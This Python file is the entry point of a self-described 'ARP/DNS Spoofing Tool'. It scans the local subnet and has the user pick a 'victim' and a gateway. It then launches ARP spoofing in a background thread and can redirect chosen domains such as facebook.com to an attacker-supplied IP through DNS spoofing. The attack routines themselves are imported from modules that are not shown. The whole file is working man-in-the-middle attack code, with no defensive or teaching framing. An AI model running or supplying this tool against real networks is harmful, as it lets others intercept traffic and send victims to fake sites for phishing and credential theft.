# main.py

from network_utils import scan_network, get_attacker_ip, get_attacker_mac
from attacks.arp_spoof import start_arp_spoofing
from attacks.dns_spoof import start_dns_spoofer
from scapy.arch import get_if_list
import threading
import signal
import sys

# Pour stopper les threads
stop_event = threading.Event()

def choose_host(hosts, role):
    print(f"\nSelect a {role}:")
    for i, (ip, mac) in enumerate(hosts):
        print(f"{i}: {ip} ({mac})")
    while True:
        try:
            choice = int(input(f"Enter index for {role}: "))
            return hosts[choice]
        except (ValueError, IndexError):
            print("Invalid selection, try again.")

def main():
    print("=== ARP/DNS Spoofing Tool ===")

    # 1. Choix de l’interface
    interfaces = get_if_list()
    print("\nAvailable network interfaces:")
    for i, iface in enumerate(interfaces):
        print(f"{i}: {iface}")
    while True:
        try:
            iface_idx = int(input("Choose interface index: "))
            iface = interfaces[iface_idx]
            break
        except (ValueError, IndexError):
            print("Invalid choice, try again.")

    # 2. Récupérer IP/MAC de l’attaquant
    attacker_ip = get_attacker_ip(iface)
    attacker_mac = get_attacker_mac(iface)

    # 3. Scan réseau
    subnet = ".".join(attacker_ip.split(".")[:-1]) + ".0/24"
    hosts = scan_network(subnet, iface=iface)

    if len(hosts) < 2:
        print("[-] Not enough devices on network to launch attack.")
        sys.exit(1)

    # 4. Choix victime et passerelle
    victim_ip, victim_mac = choose_host(hosts, "victim")
    gateway_ip, gateway_mac = choose_host(hosts, "gateway")

    # 5. Lancer ARP spoof en thread
    arp_thread = threading.Thread(
        target=start_arp_spoofing,
        args=(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, iface),
        daemon=True
    )
    arp_thread.start()

    # 6. DNS spoofing ?
    dns_choice = input("\nEnable DNS spoofing? (y/n): ").strip().lower()
    if dns_choice == "y":
        spoofed_domains = input("Enter comma-separated domains to spoof (e.g. facebook.com,google.com): ").strip().split(",")
        fake_ip = input("Enter the fake IP address to redirect to: ").strip()

        # Lancer DNS spoof dans le main thread (bloquant)
        try:
            start_dns_spoofer(
                spoofed_domains=[d.strip() for d in spoofed_domains],
                fake_ip=fake_ip,
                attacker_mac=attacker_mac,
                iface=iface
            )
        except KeyboardInterrupt:
            print("\n[!] Stopped by user.")

    else:
        print("[*] ARP spoofing is running. Press Ctrl+C to stop...")
        try:
            while True:
                signal.pause()
        except KeyboardInterrupt:
            print("\n[!] Stopped by user.")

if __name__ == "__main__":
    main()
